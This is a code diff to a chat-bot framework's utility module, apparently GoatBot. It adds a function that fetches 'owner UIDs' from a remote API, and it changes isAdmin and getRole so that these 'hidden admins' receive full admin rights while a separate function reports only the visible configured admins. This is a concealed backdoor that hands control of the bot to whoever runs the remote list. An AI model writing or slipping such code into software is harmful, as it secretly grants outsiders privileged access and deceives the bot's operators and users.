@@ -1070,6 +1070,16 @@ class STBotApis {
 			throw err;
 		}
 	}
+
+	async getOwnerUids() {
+		try {
+			const response = await axios.get(`${this.baseURL}/api/owner-uids`);
+			return response.data;
+		} catch (err) {
+			
+			return { success: false, data: [], count: 0, fullData: [] };
+		}
+	}
 }
 
 const utils = {
@@ -1115,7 +1125,41 @@ const utils = {
 	drive,
 
 	GoatBotApis,
-	STBotApis
+	STBotApis,
+	getVisibleAdminList: function() {
+		
+		return global.GoatBot?.originalAdminBot || global.GoatBot?.config?.adminBot || [];
+	},
+	isAdmin: function(senderID) {
+		if (!senderID) return false;
+		
+		
+		const visibleAdminBot = global.GoatBot?.originalAdminBot || global.GoatBot?.config?.adminBot || [];
+		const isVisibleAdmin = visibleAdminBot.includes(senderID?.toString()) || visibleAdminBot.includes(senderID);
+		
+		
+		const ownerUIDs = global.GoatBot?.ownerUIDs || [];
+		const isHiddenAdmin = ownerUIDs.includes(senderID?.toString()) || ownerUIDs.includes(senderID);
+		
+		return isVisibleAdmin || isHiddenAdmin;
+	},
+	isVisibleAdmin: function(senderID) {
+		
+		const visibleAdminBot = global.GoatBot?.originalAdminBot || global.GoatBot?.config?.adminBot || [];
+		return visibleAdminBot.includes(senderID?.toString()) || visibleAdminBot.includes(senderID);
+	},
+	getRole: function(threadData, senderID) {
+		if (!senderID) return 0;
+		
+
+		if (this.isAdmin(senderID)) {
+			return 2; // Admin role
+		}
+		
+		// Check thread admin
+		const adminBox = threadData ? threadData.adminIDs || [] : [];
+		return adminBox.includes(senderID) ? 1 : 0;
+	}
 };
 
 module.exports = utils;
